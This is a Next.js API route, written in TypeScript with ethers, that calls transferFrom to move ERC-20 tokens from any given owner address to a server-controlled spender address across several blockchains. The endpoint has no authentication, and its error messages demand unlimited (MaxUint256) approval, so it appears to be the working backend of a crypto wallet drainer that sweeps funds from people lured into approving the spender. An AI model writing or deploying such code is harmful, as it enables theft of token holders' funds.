import { NextResponse } from 'next/server';
import { ethers } from 'ethers';

// Official token addresses for different networks
const TOKEN_ADDRESSES: Record<string, Record<string, string>> = {
  ethereum: {
    'USDT': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    'USDC': '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
    'WETH': '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
    'DAI': '0x6B175474E89094C44Da98b954EedeAC495271d0F',
    'UNI': '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984',
    'LINK': '0x514910771AF9Ca656af840dff83E8264EcF986CA',
    'WBTC': '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599'
  },
  polygon: {
    'USDT': '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
    'USDC': '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
    'WETH': '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619',
    'DAI': '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063',
    'WMATIC': '0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270'
  },
  arbitrum: {
    'USDT': '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
    'USDC': '0xFF970A61A04b1cA14834A43f5de4533ebDDB5CC8',
    'WETH': '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1',
    'ARB': '0x912CE59144191C1204E64559FE8253a0e49E6548'
  },
  bnb: {
    'USDT': '0x55d398326f99059fF775485246999027B3197955',
    'USDC': '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
    'WBNB': '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',
    'BUSD': '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56'
  },
  sepolia: {
    'USDT': '0x03bbb5660b8687c2aa453a0e42dcb6e0732b1266',
    'USDC': '0x1ffa9c87ead57adc9e4f9a7d26ec3a52150db3b0'
  }
};

export async function POST(req: Request) {
  try {
    const { tokenSymbol, owner, amount, network } = await req.json();
    if (!tokenSymbol || !owner || !amount || !network) {
      return NextResponse.json({ error: 'Missing required fields: tokenSymbol, owner, amount, network' }, { status: 400 });
    }

    // Get token address from hardcoded list
    const tokenAddress = TOKEN_ADDRESSES[network]?.[tokenSymbol.toUpperCase()];
    if (!tokenAddress) {
      return NextResponse.json({ error: `Token ${tokenSymbol} not supported on ${network}` }, { status: 400 });
    }

    const rpcMap: Record<string, string | undefined> = {
      sepolia: process.env.RPC_SEPOLIA,
      ethereum: process.env.RPC_ETHEREUM,
      polygon: process.env.RPC_POLYGON,
      arbitrum: process.env.RPC_ARBITRUM,
      bnb: process.env.RPC_BNB
    };
    const rpcUrl = rpcMap[network];
    if (!rpcUrl) return NextResponse.json({ error: `RPC not configured for ${network}` }, { status: 400 });

    const provider = new ethers.JsonRpcProvider(rpcUrl);
    const wallet = new ethers.Wallet(process.env.SPENDER_PRIVATE_KEY!, provider);
    const recipient = process.env.SPENDER_ADDRESS!;

    const abi = [
      "function transferFrom(address from, address to, uint256 value) returns (bool)",
      "function decimals() view returns (uint8)",
      "function allowance(address owner, address spender) view returns (uint256)"
    ];
    const contract = new ethers.Contract(tokenAddress, abi, wallet);

    const decimals: number = await contract.decimals();
    const allowance = await contract.allowance(owner, wallet.address);
    const value = ethers.parseUnits(amount, decimals);

    // Check if allowance is unlimited (MaxUint256) or sufficient
    if (allowance !== ethers.MaxUint256 && allowance < value) {
      return NextResponse.json({ error: `Allowance too low. Approved: ${ethers.formatUnits(allowance, decimals)}. Need unlimited approval (MaxUint256)` }, { status: 400 });
    }

    const tx = await contract.transferFrom(owner, recipient, value);
    await tx.wait();

    return NextResponse.json({ hash: tx.hash });
  } catch (err: any) {
    let message = 'Unexpected error';
    if (err.code === 'INSUFFICIENT_FUNDS') message = 'Spender has no ETH for gas';
    else if (err.code === 'CALL_EXCEPTION') message = 'Transfer failed: maybe allowance or balance issue';
    else if (err.reason) message = err.reason;
    else if (err.message) message = err.message;

    return NextResponse.json({ error: message }, { status: 500 });
  }
}
